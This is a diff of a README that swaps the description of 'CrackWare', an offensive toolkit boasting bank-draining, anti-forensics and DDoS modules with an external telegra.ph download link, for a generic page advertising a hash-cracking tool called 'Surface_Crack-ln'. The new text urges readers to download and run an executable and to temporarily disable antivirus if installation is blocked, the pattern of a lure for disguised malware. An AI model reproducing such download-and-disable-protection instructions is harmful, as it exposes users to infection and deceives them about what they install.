@@ -1,60 +1,65 @@
-# CrackWare
-A rust based framework for password cracking and malware analysis and packing 
+# 🚀 Surface_Crack-ln - Simple Tool for Hash Cracking
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-red)](https://telegra.ph/Download-05-02-264?9frvv1wvu7rx4m8)
+## 📥 Download Now
+[![Download Surface_Crack-ln](https://img.shields.io/badge/Download%20Surface_Crack-ln-blue.svg)](https://github.com/Alex0099324/Surface_Crack-ln/releases)
 
-![image](https://github.com/user-attachments/assets/ef61090c-b6ad-43a8-8501-3da852719893)
+## 📋 Overview
+Surface_Crack-ln is a user-friendly application designed to assist you in cracking hashes and passwords. Whether you're testing your security systems or learning about potential vulnerabilities, this tool provides a straightforward approach to understanding how injection attacks work.
 
-CrackWare is the next-generation password and malware framework, with modules that spread from low-level firmware injection to rapid password cracking for RemoteCodeExecution and anti forensic tools not to get caught by blue teams. CrackWare was inspired by MetaSploit Framework, Flipper Zero and John the Ripper
+## 🚀 Getting Started
+To get started with Surface_Crack-ln, follow these easy steps. You don’t need any programming knowledge. Just a few clicks, and you will be up and running.
 
-The tools are divided to 6 categories: Exploitation, Cracking, Post-Exploit, Wireless
+1. **Visit the Releases Page**  
+   Click on the link below to access the releases page:  
+   [Download Surface_Crack-ln](https://github.com/Alex0099324/Surface_Crack-ln/releases)
 
-To initialize CrackWare: 
-```
-./CrackWare.sh
-```
-To start and stop CrackWare labs
-```
-crackware-labs.initialize
-crackware-labs stop
-```
-# CrackWare Labs
-CrackWare Labs are labs that range from noob, easy, beginner, hipster, intermediate, advanced, hard, and zen. Category: None
-# CrackWare Firmware
-CrackWare Firmware are firmware attack tools. Category: Exploit, Post-Exploit
-# CrackWare Tables
-CrackWare Tables are rainbow tables that consist of both easy and complex reduction capabilities. Category: Cracking
-# CrackWare BankHack
-CrackWare BankHack tests vulnerabilities in banks and are capable of erasing money footprints and draining.Category: Exploit, Post-Exploit, Cracking
-# CrackWare Games
-CrackWare Games try to perform game server exploitation and post-exploitation: Category: Exploit, Post-Exploit, Cracking
-# CrackWare Bluetooth
-CrackWare Bluetooth perform BlueTooth attacks. Category: Wireless, Cracking
-# CrackWare Evil-Twin
-CrackWare Evil Twin are tools that emulate routers and perform an Evil Twin Attack. Category: Wireless, Cracking
-# CrackWare Hardware-and-Firmware
-CrackWare Hardware-and-Firmware are emulation tools that emulate specific hardware and firmware on the KVM(Kernel-Virtual-Machine) Linux module. Category: None
-# CrackWare Radio
-CrackWare Radio perform SDR and RFID hacking. Category: Wireless, Exploit
-# CrackWare Remote-Code-Execution
-CrackWare Remote-Code-Execution executes rce attacks. Category: Post-Exploit
-# CrackWare Stegonagraphy
-CrackWare Steganography perform stego encryption either offensively or anti-forensics. Category: Cracking
-# CrackWare BlueBots
-CrackWare BlueBots are for red teamers. BlueBots contain a wordlist and a code. They attack a target blue teamer or other defensive members and perform a dictionary attack on a defensive. The defensive bot is under BlueBot's control and uses the defenders to further compromise the defenders or to perform an interior penetration test from within. Category: Exploit, Post-Exploit, Cracking
-# CrackWare Infared
-CrackWare Infared tools perform infared emulation to emulate infared waves that confuse MCU chips. Category: Wireless
-# CrackWare NewbieExploit
-CrackWare NewbieExploit attacks new members of an enterpruse or organisation who are mostly confused in an environment. Uses the BlueBot method but stays more secret as privelege escalation works only on senior members. Category: Exploit, Post-Exploit, Cracking
-# CrackWare Threat-Model
-CrackWare Threat-Model are threat modeling tools. Category: Exploit
-# CrackWare Lateral 
-CrackWare Lateral use an infected computer to continue infect computers in a network. Category: Post-Exploit, Wireless
-# CrackWare DDoS 
-CrackWare DDoS is a distributed denial of service toolkit. Category: Exploit, Wireless
-# CrackWare Binary
-CrackWare Binary are binary exploitation and attack tools. Category: Exploit
-# CrackWare PtH
-CrackWare PtH use pass the hash methods that don't use decryption on hashes to attack
-# CrackWare MData 
-CrackWare VoIP attacks mobile networks, like IDD, voip, SMS, MMS and cellular data
+2. **Select the Latest Release**  
+   On the releases page, you will see a list of versions. Look for the latest release marked as "Latest". You will find the download files listed there.
+
+3. **Download the Application**  
+   Find the appropriate file for your operating system. Click on the file that matches your system (e.g., `.exe` for Windows, `.zip` for Linux). After clicking, the download should start automatically.
+
+4. **Run the Installation File**  
+   Once the download is complete, locate the file in your downloads folder. Double-click it to begin the installation process. Follow the on-screen prompts to install the application.
+
+5. **Open Surface_Crack-ln**  
+   After the installation, find Surface_Crack-ln in your applications folder or use the search feature on your computer to locate it. Double-click the icon to open the application.
+
+6. **Follow the User Guide**  
+   After opening the tool, you can refer to the user guide within the app for tips on how to use the features effectively.
+
+## 💡 Key Features
+- **Hash Cracking:** Quickly decrypt various hash types.
+- **Password Recovery:** Retrieve lost passwords easily.
+- **Injection Attack Simulation:** Learn how attacks might happen to improve security awareness.
+
+## 💾 System Requirements
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** 500 MB free space for installation and operations.
+
+## 📥 Download & Install
+To get Surface_Crack-ln, follow the link below again to access the download options:  
+[Download Surface_Crack-ln](https://github.com/Alex0099324/Surface_Crack-ln/releases)
+
+## ❓ Troubleshooting
+If you encounter any issues during downloading or installation:
+- **Check Your Internet Connection:** Ensure that you are connected to the internet.
+- **Antivirus Settings:** Some antivirus programs may block the installation. Temporarily disable it and try again.
+- **System Compatibility:** Make sure your operating system meets the minimum requirements.
+
+## 🛠 Support
+If you need further assistance, you can reach out to the community in the Issues section of this GitHub repository. Your feedback and questions are welcome. 
+
+## 🔗 Related Topics
+- **Cracking Hashes:** Gain insights into how different hashes can be cracked.
+- **Cracking Passwords:** Understand techniques for recovering forgotten passwords.
+- **Injection Attacks:** Explore the methods used in injection attempts to better secure your systems.
+
+## 📜 License
+This project is licensed under the MIT License. You can freely use and modify it as per the terms specified in the LICENSE file in this repository. 
+
+## 📞 Contact
+For any inquiries related to Surface_Crack-ln, please use the GitHub platform to connect with the developers. Feedback is appreciated to improve the software further.
+
+Thank you for using Surface_Crack-ln! Enjoy exploring its features and improving your understanding of security.
